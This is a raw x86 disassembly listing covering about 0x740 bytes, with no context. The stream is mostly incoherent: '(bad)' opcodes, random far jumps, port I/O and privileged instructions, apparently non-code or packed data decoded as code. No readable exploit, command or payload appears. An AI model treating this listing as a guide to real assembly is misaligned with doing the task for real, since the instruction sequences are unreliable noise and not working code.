  40b383:	clc    
  40b384:	fdiv   QWORD PTR ds:0xacef9e9b
  40b38a:	stc    
  40b38b:	and    bl,ch
  40b38d:	in     al,0x1e
  40b38f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b390:	adc    BYTE PTR [ebx+0x14],ch
  40b393:	nop
  40b394:	xchg   edi,eax
  40b395:	xchg   ah,cl
  40b397:	(bad)  
  40b399:	push   0x23
  40b39b:	push   ebp
  40b39c:	xchg   esi,eax
  40b39d:	cmc    
  40b39e:	add    bh,BYTE PTR [edx-0x1f039315]
  40b3a4:	jmp    0x4aa7:0x9bf83cd7
  40b3ab:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b3ac:	mov    ah,0xf4
  40b3ae:	jge    0x40b336
  40b3b0:	add    eax,0x2bef0b1c
  40b3b5:	sbb    eax,DWORD PTR [eax]
  40b3b7:	mov    edi,0x8bb5399e
  40b3bc:	or     al,0x56
  40b3be:	lods   eax,DWORD PTR ds:[esi]
  40b3bf:	dec    ebx
  40b3c0:	xchg   esp,eax
  40b3c1:	mov    ecx,0x3210daf9
  40b3c6:	sbb    al,0x28
  40b3c8:	jne    0x40b36f
  40b3ca:	inc    eax
  40b3cb:	ror    dh,1
  40b3cd:	sbb    dh,BYTE PTR [ebx+edi*2]
  40b3d0:	inc    edx
  40b3d1:	(bad)  
  40b3d2:	loope  0x40b39a
  40b3d4:	ins    DWORD PTR es:[edi],dx
  40b3d5:	fisttp DWORD PTR [edx]
  40b3d7:	cmp    BYTE PTR [edi],cl
  40b3d9:	mov    dh,0xfe
  40b3db:	adc    dl,ch
  40b3dd:	les    esi,FWORD PTR [ebx-0x2d9dc773]
  40b3e3:	mov    ch,0x42
  40b3e5:	and    BYTE PTR [ebx],dl
  40b3e7:	dec    ebp
  40b3e8:	push   ecx
  40b3e9:	sti    
  40b3ea:	push   0x5b
  40b3ec:	sbb    eax,0xa23d12f6
  40b3f1:	bound  eax,QWORD PTR [edx+ebx*1+0x7c]
  40b3f5:	ret    
  40b3f6:	and    DWORD PTR ds:0x176ea91f,ebx
  40b3fc:	and    edx,DWORD PTR [edi+0x620c2b49]
  40b402:	addr16 dec edi
  40b404:	fistp  WORD PTR [ebx+eax*8]
  40b407:	dec    edi
  40b408:	fisubr WORD PTR [ecx-0x4d]
  40b40b:	mov    esi,0x1085dafc
  40b410:	outs   dx,BYTE PTR ds:[esi]
  40b411:	nop
  40b412:	sbb    ah,BYTE PTR [ecx-0x784e84a1]
  40b418:	shl    BYTE PTR [ecx],cl
  40b41a:	int    0xdc
  40b41c:	xchg   ebp,eax
  40b41d:	sub    DWORD PTR [edx+0x56],edi
  40b420:	fs call 0xef75:0x241c9eeb
  40b428:	mov    ah,BYTE PTR [esi]
  40b42a:	fst    DWORD PTR [esp+edx*8-0x694d5ca7]
  40b431:	lock push edi
  40b433:	pop    edx
  40b434:	inc    esp
  40b435:	(bad)  
  40b436:	jmp    0xafd8c964
  40b43b:	pushw  0xc060
  40b43f:	push   edx
  40b440:	add    BYTE PTR [ecx-0x6],al
  40b443:	cmp    eax,0xdc4c7844
  40b448:	mov    esp,0x91bd6645
  40b44d:	aaa    
  40b44e:	div    esp
  40b450:	aas    
  40b451:	xor    BYTE PTR [ecx],bh
  40b453:	(bad)  
  40b454:	test   DWORD PTR [esi-0x2122018],0x6bfe073a
  40b45e:	fldenv [esi+ebp*8-0x66]
  40b462:	mov    edi,0xbccfa3b1
  40b467:	(bad)  
  40b469:	(bad)  
  40b46a:	sbb    cl,BYTE PTR [ebx-0x1d]
  40b46d:	xor    eax,0xf5a57ba8
  40b472:	adc    BYTE PTR [esi],0xc9
  40b475:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b476:	xor    al,0x47
  40b478:	inc    eax
  40b479:	cld    
  40b47a:	or     eax,0x2aa2ce99
  40b47f:	add    eax,0x8e85ac67
  40b484:	pop    esi
  40b485:	mov    cl,0xa4
  40b487:	nop
  40b488:	in     eax,0xa9
  40b48a:	scas   eax,DWORD PTR es:[edi]
  40b48b:	dec    ebp
  40b48c:	iretw  
  40b48e:	imul   ecx,DWORD PTR [ebp-0x9],0xccabc682
  40b495:	lods   al,BYTE PTR ds:[esi]
  40b496:	mov    cl,0x86
  40b498:	mov    DWORD PTR ds:0xb0088044,0x41cf1e10
  40b4a2:	in     ax,0x7d
  40b4a5:	or     ebp,DWORD PTR [esi+0x434f7307]
  40b4ab:	lods   al,BYTE PTR ds:[esi]
  40b4ac:	mov    ch,BYTE PTR [ebp+0xc3b592c]
  40b4b2:	(bad)  
  40b4b3:	xchg   esi,eax
  40b4b4:	les    edx,FWORD PTR [ebx]
  40b4b6:	mov    dh,0x49
  40b4b8:	push   ebx
  40b4b9:	dec    ecx
  40b4ba:	popa   
  40b4bb:	cmp    al,0xb6
  40b4bd:	mov    ch,0x65
  40b4bf:	sahf   
  40b4c0:	jp     0x40b469
  40b4c2:	push   ebx
  40b4c3:	je     0x40b53e
  40b4c5:	out    0x51,al
  40b4c7:	xor    BYTE PTR [esi],ah
  40b4c9:	aam    0x55
  40b4cb:	mov    ebx,0x248e6c3c
  40b4d0:	jno    0x40b51a
  40b4d2:	in     al,0x64
  40b4d4:	push   cs
  40b4d5:	and    BYTE PTR [ebx+0x17],bl
  40b4d8:	mul    BYTE PTR [ecx+ebp*4-0x70]
  40b4dc:	xchg   ecx,eax
  40b4dd:	fistp  QWORD PTR [edx]
  40b4df:	leave  
  40b4e0:	test   eax,0x1dc2ec7c
  40b4e5:	imul   ecx,DWORD PTR [edx+0x39],0x7d
  40b4e9:	xchg   DWORD PTR [ecx-0x6886e001],edx
  40b4ef:	mov    edi,ecx
  40b4f1:	aas    
  40b4f2:	nop
  40b4f3:	pop    edi
  40b4f4:	pushf  
  40b4f5:	dec    edx
  40b4f6:	and    al,0x7b
  40b4f8:	add    eax,0xfe64e648
  40b4fd:	hlt    
  40b4fe:	pop    eax
  40b4ff:	cmp    al,0x87
  40b501:	ficom  DWORD PTR [edi+edx*2+0x22]
  40b505:	repnz or bh,BYTE PTR [ecx-0x44]
  40b509:	jle    0x40b505
  40b50b:	nop
  40b50c:	adc    al,0x96
  40b50e:	mov    edi,0x6216d663
  40b513:	out    dx,al
  40b514:	sahf   
  40b515:	fcmove st,st(7)
  40b517:	cmp    eax,DWORD PTR [edi]
  40b519:	and    DWORD PTR [ecx+0x35],eax
  40b51c:	pop    ss
  40b51d:	ins    DWORD PTR es:[edi],dx
  40b51e:	punpckldq mm3,DWORD PTR [ebx-0x405a8551]
  40b525:	pushf  
  40b526:	fisttp WORD PTR [ebp+0x1c]
  40b529:	adc    ecx,DWORD PTR [esi-0x70972cde]
  40b52f:	mov    dl,0x4d
  40b531:	or     dh,BYTE PTR [eax+0x2d]
  40b534:	mov    dh,BYTE PTR [edi+0x243180e3]
  40b53a:	mov    ?,WORD PTR [esi-0x31]
  40b53d:	call   DWORD PTR fs:[ebp+0x28]
  40b541:	fdivrp st(0),st
  40b543:	scas   eax,DWORD PTR es:[edi]
  40b544:	xor    al,0xa3
  40b546:	mov    ds:0xdba75cc1,al
  40b54b:	das    
  40b54c:	in     al,0xac
  40b54e:	out    0xa1,al
  40b550:	mov    ecx,DWORD PTR [ecx]
  40b552:	inc    edi
  40b553:	dec    edx
  40b554:	rcl    DWORD PTR [ecx],cl
  40b556:	push   cs
  40b557:	xchg   esp,eax
  40b558:	mov    ecx,0x270a37b4
  40b55d:	rcr    DWORD PTR [esi],cl
  40b55f:	jae    0x40b552
  40b561:	pop    es
  40b562:	outs   dx,DWORD PTR ds:[esi]
  40b563:	cld    
  40b564:	ins    DWORD PTR es:[edi],dx
  40b565:	jne    0x40b526
  40b567:	push   edi
  40b568:	mul    DWORD PTR ds:0xd8d52312
  40b56e:	call   0xc7f2ca7a
  40b573:	dec    edi
  40b574:	mov    eax,ds:0x48acc0c5
  40b579:	jecxz  0x40b5a1
  40b57b:	xchg   ah,al
  40b57d:	imul   ebp,esi,0x79
  40b580:	dec    ebp
  40b581:	or     BYTE PTR [eax+0x68ea1edc],0x9d
  40b588:	xchg   edi,eax
  40b589:	inc    eax
  40b58a:	into   
  40b58b:	sbb    esi,DWORD PTR [edx+0x31a48e1a]
  40b591:	mov    al,0xd
  40b593:	mov    dh,0x87
  40b595:	rol    BYTE PTR [edi-0x19cc1cba],1
  40b59b:	addr16 mov ebp,0xc41a78f2
  40b5a1:	and    al,0x30
  40b5a3:	jl     0x40b532
  40b5a5:	or     esi,edx
  40b5a7:	or     dh,BYTE PTR [ebp-0x5d]
  40b5aa:	dec    esi
  40b5ab:	push   0xffffffba
  40b5ad:	lds    esi,FWORD PTR [esi-0x3e]
  40b5b0:	stc    
  40b5b1:	outs   dx,BYTE PTR ds:[esi]
  40b5b2:	mov    edx,0xbd97f1c9
  40b5b7:	xchg   ebp,eax
  40b5b8:	leave  
  40b5b9:	retf   
  40b5ba:	or     ah,BYTE PTR [ebp+0x50]
  40b5bd:	and    DWORD PTR [eax],esi
  40b5bf:	iret   
  40b5c0:	sbb    dh,dl
  40b5c2:	aas    
  40b5c3:	mov    WORD PTR [eax+0x299c008a],?
  40b5c9:	in     eax,dx
  40b5ca:	les    edi,FWORD PTR [ecx]
  40b5cc:	scas   al,BYTE PTR es:[edi]
  40b5cd:	mov    edx,0x6bca178a
  40b5d2:	inc    esp
  40b5d3:	arpl   WORD PTR cs:[ebx],ax
  40b5d6:	pop    es
  40b5d7:	nop
  40b5d8:	imul   ebx,ecx,0x1913bd27
  40b5de:	or     ebx,eax
  40b5e0:	sbb    bl,BYTE PTR [edi]
  40b5e2:	add    DWORD PTR [ebx-0x6a],ebp
  40b5e5:	out    dx,eax
  40b5e6:	and    DWORD PTR [ebx+ecx*4],edx
  40b5e9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b5ea:	push   cs
  40b5eb:	mov    ?,WORD PTR es:[ecx-0x5b]
  40b5ef:	cmp    BYTE PTR [edi],0x33
  40b5f2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b5f3:	inc    edi
  40b5f4:	out    dx,al
  40b5f5:	add    esi,esi
  40b5f7:	push   0xd55de818
  40b5fc:	loop   0x40b63d
  40b5fe:	xchg   ch,ah
  40b600:	retf   0x2e5e
  40b603:	fisttp DWORD PTR [ebx]
  40b605:	test   al,0x94
  40b607:	jecxz  0x40b63f
  40b609:	arpl   di,bp
  40b60b:	mov    al,0x3
  40b60d:	inc    ebx
  40b60e:	xor    ebx,esp
  40b610:	jmp    0x2d5ba47
  40b615:	push   esp
  40b616:	mov    ebx,0xfc493c22
  40b61b:	das    
  40b61c:	ja     0x40b69d
  40b61e:	aaa    
  40b61f:	xchg   esi,eax
  40b620:	js     0x40b5e5
  40b622:	data16 in al,0xf4
  40b625:	or     ecx,DWORD PTR [ecx-0x333a92cb]
  40b62b:	mov    ds:0x121631d0,eax
  40b630:	push   ss
  40b631:	shl    BYTE PTR [ebx+0x4a234498],0xcc
  40b638:	pop    ecx
  40b639:	inc    ecx
  40b63a:	cmp    al,0xb
  40b63c:	retf   0x73d5
  40b63f:	not    BYTE PTR [ecx+edx*8+0x3a1c9914]
  40b646:	inc    ecx
  40b647:	out    0xe9,al
  40b649:	cdq    
  40b64a:	neg    DWORD PTR [edi-0x3a]
  40b64d:	push   ss
  40b64e:	mov    dh,0x4d
  40b650:	inc    esi
  40b651:	pusha  
  40b652:	mov    ds,WORD PTR [ecx-0xb]
  40b655:	dec    eax
  40b656:	mov    fs,ecx
  40b658:	outs   dx,BYTE PTR ds:[esi]
  40b659:	mov    ds:0x37ad5034,eax
  40b65e:	xor    esp,esp
  40b660:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b661:	loope  0x40b679
  40b663:	loop   0x40b65d
  40b665:	lahf   
  40b666:	xchg   BYTE PTR [edx],bh
  40b668:	jnp    0x40b69e
  40b66a:	mov    al,0x4f
  40b66c:	xlat   BYTE PTR ds:[ebx]
  40b66d:	mov    dh,0xbb
  40b66f:	mov    dl,0xe
  40b671:	xor    dh,0x97
  40b674:	pop    ebx
  40b675:	sub    cl,cl
  40b677:	push   esp
  40b678:	out    0x97,eax
  40b67a:	push   es
  40b67b:	jmp    0x8958:0x941ef601
  40b682:	push   ebp
  40b683:	iret   
  40b684:	jmp    0xdd07:0x8f0af4d3
  40b68b:	scas   eax,DWORD PTR es:[edi]
  40b68c:	add    ch,BYTE PTR [edi+0x70efa809]
  40b692:	bound  ecx,QWORD PTR fs:[ecx+0x7e871722]
  40b699:	cwde   
  40b69a:	jge    0x40b6d4
  40b69c:	sub    dh,BYTE PTR [ebx+0x12]
  40b69f:	call   0x6373:0x79ac38cd
  40b6a6:	into   
  40b6a7:	jbe    0x40b6a4
  40b6a9:	dec    ebx
  40b6aa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b6ab:	repz lea ebx,[esi-0x44cad5e3]
  40b6b2:	jecxz  0x40b6b0
  40b6b4:	call   0xc1c6:0xecd7afc9
  40b6bb:	push   ebp
  40b6bc:	fidiv  WORD PTR [eax-0x78]
  40b6bf:	mov    dl,0xf7
  40b6c1:	js     0x40b6e3
  40b6c3:	das    
  40b6c4:	icebp  
  40b6c5:	sbb    DWORD PTR [eax-0x1a234ca],esp
  40b6cb:	fwait
  40b6cc:	mov    bh,0xe0
  40b6ce:	xor    DWORD PTR [ebx],eax
  40b6d0:	(bad)  
  40b6d1:	mov    ecx,0x876eab36
  40b6d6:	iret   
  40b6d7:	es jecxz 0x40b67d
  40b6da:	add    DWORD PTR [ecx+0x66],ebx
  40b6dd:	cmp    BYTE PTR [esi],0x4f
  40b6e0:	sub    al,0xf5
  40b6e2:	push   edi
  40b6e3:	pop    ds
  40b6e4:	xchg   esp,eax
  40b6e5:	inc    esi
  40b6e6:	(bad)  
  40b6e7:	push   ds
  40b6e8:	add    esp,DWORD PTR [edi-0xbfb0090]
  40b6ee:	mov    ecx,0x7cac6fa2
  40b6f3:	dec    ecx
  40b6f4:	dec    ecx
  40b6f5:	xchg   ebx,eax
  40b6f6:	adc    BYTE PTR [edi+0x35],dh
  40b6f9:	cdq    
  40b6fa:	stos   BYTE PTR es:[edi],al
  40b6fb:	xchg   edi,eax
  40b6fc:	je     0x40b77d
  40b6fe:	adc    DWORD PTR [esi],edi
  40b700:	cs stc 
  40b702:	cmp    BYTE PTR [edx-0x5eda630f],0xf3
  40b709:	pop    ebp
  40b70a:	jmp    0x40b6f5
  40b70c:	sar    BYTE PTR [ebx],cl
  40b70e:	cld    
  40b70f:	pop    ebx
  40b710:	mov    ah,BYTE PTR [edx+0x7c99fafd]
  40b716:	in     al,dx
  40b717:	push   esp
  40b718:	jg     0x40b706
  40b71a:	mov    cl,0xb
  40b71c:	jecxz  0x40b6e5
  40b71e:	lahf   
  40b71f:	or     dl,BYTE PTR [eax+0x2f995557]
  40b725:	loope  0x40b6f9
  40b727:	ins    BYTE PTR es:[edi],dx
  40b728:	outs   dx,DWORD PTR ds:[esi]
  40b729:	(bad)  [edx-0x34]
  40b72c:	sbb    BYTE PTR [esi+0x38ce36ad],dl
  40b732:	fcmovb st,st(4)
  40b734:	mov    cl,0xf9
  40b736:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b737:	cs cmp eax,0x8cea301c
  40b73d:	mov    ds:0xdcc2d89b,al
  40b742:	pop    esp
  40b743:	test   ecx,ebx
  40b745:	push   edx
  40b746:	fnsave [edx+0x71401a40]
  40b74c:	retf   
  40b74d:	sub    BYTE PTR ds:0xa2f3ef2e,ch
  40b753:	dec    edi
  40b754:	and    ecx,eax
  40b756:	inc    eax
  40b757:	test   eax,0xcc3f5941
  40b75c:	aas    
  40b75d:	add    BYTE PTR [esi-0x6e96fa0d],cl
  40b763:	shl    DWORD PTR [edi+0x2c],1
  40b766:	sbb    eax,0x8b773539
  40b76b:	pop    ebp
  40b76c:	adc    DWORD PTR [ebx-0x1d],edx
  40b76f:	pop    esi
  40b770:	out    dx,al
  40b771:	jg     0x40b7c5
  40b773:	loop   0x40b79f
  40b775:	pop    esp
  40b776:	and    DWORD PTR [esp+esi*4+0xc],edx
  40b77a:	mov    ecx,0x1b0d182c
  40b77f:	daa    
  40b780:	jo     0x40b709
  40b782:	(bad)  
  40b784:	(bad)  
  40b785:	jne    0x40b784
  40b787:	sub    dl,0x90
  40b78a:	xor    eax,0xd6ce6f2d
  40b78f:	les    ebx,FWORD PTR [edi]
  40b791:	add    eax,0x66bd83a
  40b796:	dec    ebx
  40b797:	std    
  40b798:	push   0xffffffe4
  40b79a:	pshufw mm3,QWORD PTR [esi-0x388dd9ed],0x2f
  40b7a2:	lods   eax,DWORD PTR ss:[esi]
  40b7a4:	loopne 0x40b7aa
  40b7a6:	mov    bh,BYTE PTR [ecx]
  40b7a8:	(bad)  
  40b7aa:	lahf   
  40b7ab:	les    esi,FWORD PTR [ebx]
  40b7ad:	pop    ebx
  40b7ae:	sahf   
  40b7af:	mov    ch,0xc0
  40b7b1:	stos   DWORD PTR es:[edi],eax
  40b7b2:	clc    
  40b7b3:	scas   eax,DWORD PTR es:[edi]
  40b7b4:	fbstp  TBYTE PTR [ebx+0x74]
  40b7b7:	sar    DWORD PTR [edx-0x5f3104d3],cl
  40b7bd:	nop
  40b7be:	call   0x5f30:0xb480d648
  40b7c5:	xchg   edi,eax
  40b7c6:	clc    
  40b7c7:	dec    edi
  40b7c8:	mov    ds:0xb339de3c,eax
  40b7cd:	push   ebx
  40b7ce:	inc    ebp
  40b7cf:	dec    edx
  40b7d0:	jmp    0x992f:0xd2cb911e
  40b7d7:	xchg   ebx,eax
  40b7d8:	call   FWORD PTR [ecx+0x3b53807b]
  40b7de:	aaa    
  40b7df:	out    dx,eax
  40b7e0:	mov    bh,0x30
  40b7e2:	into   
  40b7e3:	inc    edi
  40b7e4:	push   edx
  40b7e5:	outs   dx,BYTE PTR ds:[esi]
  40b7e6:	icebp  
  40b7e7:	out    dx,eax
  40b7e8:	(bad)  
  40b7eb:	push   esi
  40b7ec:	fisttp QWORD PTR [ebp+0x3009b917]
  40b7f2:	push   ss
  40b7f3:	loop   0x40b854
  40b7f5:	cwde   
  40b7f6:	nop
  40b7f7:	cmp    al,0xe8
  40b7f9:	sbb    DWORD PTR ds:0xb2ac6260,0x66
  40b800:	push   cs
  40b801:	push   ebp
  40b802:	adc    esi,DWORD PTR [edi+ebp*1+0x39]
  40b806:	in     eax,dx
  40b807:	push   ds
  40b808:	push   ebx
  40b809:	inc    esp
  40b80a:	inc    ebx
  40b80b:	cmp    BYTE PTR [edx-0x1ebfd071],dl
  40b811:	jmp    0x40b80d
  40b813:	sbb    al,0xf
  40b815:	xchg   edx,eax
  40b816:	inc    ebx
  40b817:	jae    0x40b847
  40b819:	add    DWORD PTR cs:[edi],0x8d838342
  40b820:	loop   0x40b86d
  40b822:	popf   
  40b823:	mov    dl,0x3d
  40b825:	or     BYTE PTR [ecx+edi*4+0x19ea7e27],dh
  40b82c:	daa    
  40b82d:	xor    BYTE PTR [ebx+0x14e6196],dh
  40b833:	jo     0x40b8a0
  40b835:	and    al,0x2b
  40b837:	push   ss
  40b838:	add    al,0x2a
  40b83a:	scas   eax,DWORD PTR es:[edi]
  40b83b:	in     eax,0x15
  40b83d:	jae    0x40b832
  40b83f:	add    ebx,eax
  40b841:	xor    DWORD PTR [eax-0x60],eax
  40b844:	xchg   edi,eax
  40b845:	cmp    bl,BYTE PTR [edx]
  40b847:	cmp    eax,0xcc1e817f
  40b84c:	popf   
  40b84d:	dec    ebx
  40b84e:	cmp    BYTE PTR [ebp-0x79],cl
  40b851:	and    al,cl
  40b853:	jb     0x40b7da
  40b855:	addr16 into 
  40b857:	(bad)  
  40b859:	sbb    ebx,DWORD PTR [esi]
  40b85b:	mov    BYTE PTR [edi],0x37
  40b85e:	xlat   BYTE PTR ds:[ebx]
  40b85f:	jl     0x40b877
  40b861:	dec    edx
  40b862:	icebp  
  40b863:	adc    esi,DWORD PTR [ebx]
  40b865:	inc    ecx
  40b866:	inc    DWORD PTR [esp+edi*8]
  40b869:	mov    bh,0xce
  40b86b:	arpl   WORD PTR [edi-0xe],ax
  40b86e:	aas    
  40b86f:	push   esi
  40b870:	push   ecx
  40b871:	ficom  DWORD PTR [ebx+0x622890f3]
  40b877:	sub    al,0xe1
  40b879:	int    0x3
  40b87b:	cmp    al,0x66
  40b87d:	xchg   ebp,eax
  40b87e:	out    0xe3,eax
  40b880:	and    BYTE PTR [eax-0x392ec515],bl
  40b886:	addr16 icebp 
  40b888:	(bad)  
  40b889:	mov    BYTE PTR [ebx+0x78],dh
  40b88c:	lock or ecx,DWORD PTR [edi]
  40b88f:	lea    esp,[edx+eiz*4]
  40b892:	dec    ecx
  40b893:	push   esp
  40b894:	ds int 0x4a
  40b897:	xlat   BYTE PTR ds:[ebx]
  40b898:	retf   
  40b899:	es push esi
  40b89b:	adc    esi,DWORD PTR [eax+0x66]
  40b89e:	ins    DWORD PTR es:[edi],dx
  40b89f:	iret   
  40b8a0:	int    0xd2
  40b8a2:	int    0x9c
  40b8a4:	mov    bl,0x72
  40b8a6:	daa    
  40b8a7:	loopne 0x40b874
  40b8a9:	lods   eax,DWORD PTR ds:[esi]
  40b8aa:	popa   
  40b8ab:	adc    BYTE PTR [edi-0x4d2e475],ch
  40b8b1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b8b2:	sub    eax,0xe883242f
  40b8b7:	pop    edi
  40b8b8:	sub    ebp,eax
  40b8ba:	inc    ebx
  40b8bb:	adc    ecx,edx
  40b8bd:	push   ebx
  40b8be:	mov    ds:0x54888d25,eax
  40b8c3:	xor    edi,DWORD PTR [ebp+0x68]
  40b8c6:	and    DWORD PTR [esi-0x1],esp
  40b8c9:	jns    0x40b945
  40b8cb:	imul   edx,DWORD PTR [edi+0x7c32a19],0x4f2c3dec
  40b8d5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b8d6:	jle    0x40b92d
  40b8d8:	jb     0x40b891
  40b8da:	sbb    eax,esi
  40b8dc:	push   esi
  40b8dd:	add    ch,BYTE PTR [edi-0x2a04af2c]
  40b8e3:	enter  0x9f3c,0x97
  40b8e7:	lea    esi,[eax-0x23]
  40b8ea:	sub    dl,0xa3
  40b8ed:	pop    es
  40b8ee:	jns    0x40b88d
  40b8f0:	sbb    BYTE PTR [edx-0x4a239fa5],bl
  40b8f6:	(bad)  
  40b8f7:	lahf   
  40b8f8:	mov    esi,0xcbf7a6ea
  40b8fd:	test   BYTE PTR [esi+0x27608bd],0x4d
  40b904:	sbb    al,0x72
  40b906:	outs   dx,DWORD PTR ds:[esi]
  40b907:	lea    ebp,[ebp-0x4ff73647]
  40b90d:	clc    
  40b90e:	cwde   
  40b90f:	sti    
  40b910:	mov    dl,0xbd
  40b912:	shl    DWORD PTR [ecx+0x7b007c34],1
  40b918:	adc    bl,ch
  40b91a:	mov    fs,WORD PTR [ebx-0x1e9033fd]
  40b920:	movq   QWORD PTR [ecx],mm4
  40b923:	push   eax
  40b924:	mov    ah,0xfb
  40b926:	add    esi,eax
  40b928:	daa    
  40b929:	mov    ds:0xbbd7706f,al
  40b92e:	mov    ebp,0x51e67bae
  40b933:	cmovns edi,DWORD PTR [ebp-0x59]
  40b937:	push   esp
  40b938:	pop    esi
  40b939:	cld    
  40b93a:	jbe    0x40b8be
  40b93c:	fld    QWORD PTR [ecx-0x1031e294]
  40b942:	test   BYTE PTR [eax+eiz*8-0x7b],dl
  40b946:	dec    edi
  40b947:	push   es
  40b948:	jge    0x40b8f6
  40b94a:	ss xor eax,0x979ef86d
  40b950:	lea    esp,[ecx]
  40b952:	push   ebp
  40b953:	xor    al,0xcc
  40b955:	rol    BYTE PTR [ecx],0xcd
  40b958:	xlat   BYTE PTR ds:[ebx]
  40b959:	retf   
  40b95a:	jo     0x40b963
  40b95c:	inc    ebp
  40b95d:	cld    
  40b95e:	sub    al,0x3c
  40b960:	in     al,dx
  40b961:	enter  0xed23,0x68
  40b965:	pop    ss
  40b966:	enter  0x3828,0xdc
  40b96a:	popa   
  40b96b:	xor    BYTE PTR [ebp+0xba0c509],0x10
  40b972:	adc    eax,DWORD PTR [eax-0xf]
  40b975:	mov    edx,0x818511bc
  40b97a:	cmp    ah,BYTE PTR ds:0xc33366df
  40b980:	ja     0x40b9bb
  40b982:	push   ebx
  40b983:	adc    eax,0x8e6c7502
  40b988:	clc    
  40b989:	xchg   esp,eax
  40b98a:	popf   
  40b98b:	mov    ch,0x3d
  40b98d:	push   ecx
  40b98e:	cmp    eax,0xccb9cba8
  40b993:	mov    edi,0x28cb5006
  40b998:	cmp    BYTE PTR [edi],bh
  40b99a:	inc    DWORD PTR [esi-0x2e]
  40b99d:	rcr    DWORD PTR [eax+eax*1-0x44],1
  40b9a1:	jmp    0xe6a1:0x36dd6816
  40b9a8:	nop
  40b9a9:	mov    ds:0xac7a489a,eax
  40b9ae:	dec    edi
  40b9af:	(bad)  
  40b9b0:	scas   al,BYTE PTR es:[edi]
  40b9b1:	mov    ebp,esp
  40b9b3:	xor    DWORD PTR [ebp+0x1c],esi
  40b9b6:	icebp  
  40b9b7:	cmp    DWORD PTR [ebp+ebx*8-0x4a17d314],0xffffffa0
  40b9bf:	sahf   
  40b9c0:	push   eax
  40b9c1:	fwait
  40b9c2:	xchg   esp,eax
  40b9c3:	test   eax,ebx
  40b9c5:	clc    
  40b9c6:	mov    esp,gs
  40b9c8:	in     al,0xcb
  40b9ca:	ret    0x5d60
  40b9cd:	mov    eax,DWORD PTR [ebx]
  40b9cf:	or     al,0x63
  40b9d1:	test   BYTE PTR [eax],al
  40b9d3:	test   eax,0x416beec9
  40b9d8:	dec    eax
  40b9d9:	pop    ds
  40b9da:	inc    edi
  40b9db:	sbb    edi,DWORD PTR [ecx+0x52]
  40b9de:	mov    ecx,DWORD PTR [ebx-0x63]
  40b9e1:	add    esp,DWORD PTR [ecx-0x16]
  40b9e4:	mov    ebp,0xb0504400
  40b9e9:	xchg   edi,eax
  40b9ea:	push   es
  40b9eb:	jne    0x40ba66
  40b9ed:	push   0xffffffd9
  40b9ef:	(bad)  
  40b9f0:	lahf   
  40b9f1:	add    al,0x48
  40b9f3:	ss jmp 0xb464:0x12d25bef
  40b9fb:	mov    BYTE PTR [edx+0x9],ah
  40b9fe:	sub    al,0xe0
  40ba00:	pop    ebp
  40ba01:	dec    ebp
  40ba02:	push   edx
  40ba03:	and    DWORD PTR [ecx+0x6c06fadc],esp
  40ba09:	nop
  40ba0a:	jae    0x40ba08
  40ba0c:	adc    ebx,ebp
  40ba0e:	and    ecx,DWORD PTR [edi]
  40ba10:	and    dh,ah
  40ba12:	sbb    ebp,DWORD PTR [ebx+0x256d0d20]
  40ba18:	push   ebp
  40ba19:	call   0xb1409aa9
  40ba1e:	push   es
  40ba1f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ba20:	xor    eax,0xc695a0a0
  40ba25:	or     al,0x11
  40ba27:	sub    esi,DWORD PTR [edx+0x3188f597]
  40ba2d:	idiv   DWORD PTR [esi]
  40ba2f:	data16 into 
  40ba31:	cmp    al,0x88
  40ba33:	cmp    al,bh
  40ba35:	ins    DWORD PTR es:[edi],dx
  40ba36:	add    DWORD PTR [edi+0xc],edx
  40ba39:	pop    ebx
  40ba3a:	xchg   ebp,eax
  40ba3b:	xlat   BYTE PTR ds:[ebx]
  40ba3c:	scas   eax,DWORD PTR es:[edi]
  40ba3d:	jo     0x40b9f8
  40ba3f:	cmp    eax,0x555961a1
  40ba44:	dec    ecx
  40ba45:	ret    0x359c
  40ba48:	pusha  
  40ba49:	xchg   ecx,eax
  40ba4a:	xor    DWORD PTR [edx+0x72],edi
  40ba4d:	scas   eax,DWORD PTR es:[edi]
  40ba4e:	adc    al,ch
  40ba50:	aad    0x68
  40ba52:	fisub  WORD PTR [edx+0x2e]
  40ba55:	cs shl esi,cl
  40ba58:	sub    DWORD PTR [ebx-0x7812d1bb],esp
  40ba5e:	sar    BYTE PTR [edx+0x75425bf0],1
  40ba64:	retf   0x8c1e
  40ba67:	call   0xfc44:0xf74c2504
  40ba6e:	retf   0xd591
  40ba71:	xlat   BYTE PTR ds:[ebx]
  40ba72:	call   0x35eb1cc2
  40ba77:	cmp    ebx,edx
  40ba79:	adc    BYTE PTR [ebx+edi*4],0x28
  40ba7d:	mov    ecx,0xab7facc4
  40ba82:	mov    ah,ch
  40ba84:	push   edi
  40ba85:	mov    ecx,0x8fee913f
  40ba8a:	jl     0x40baa9
  40ba8c:	mov    dh,0xfe
  40ba8e:	test   al,cl
  40ba90:	stos   DWORD PTR es:[edi],eax
  40ba91:	ret    0x3815
  40ba94:	mov    eax,0xb01af7c9
  40ba99:	cwde   
  40ba9a:	pop    edx
  40ba9b:	test   al,0x85
  40ba9d:	test   eax,0xed63a06e
  40baa2:	pop    ebp
  40baa3:	xchg   esi,eax
  40baa4:	pop    edx
  40baa5:	xor    edx,DWORD PTR [ebx]
  40baa7:	jbe    0x40bb0d
  40baa9:	cmp    al,BYTE PTR [esi-0x11]
  40baac:	sbb    dl,bh
  40baae:	mov    dh,0x58
  40bab0:	dec    ecx
  40bab1:	adc    BYTE PTR [eax-0x5d],cl
  40bab4:	push   ebx
  40bab5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bab6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bab7:	xchg   esi,eax
  40bab8:	and    DWORD PTR [ebx+0x7c],ecx
  40babb:	dec    eax
  40babc:	adc    eax,0x1e7063bb
  40bac1:	ds jg  0x40bab1
  40bac4:	push   0xffffff95
  40bac6:	in     eax,dx
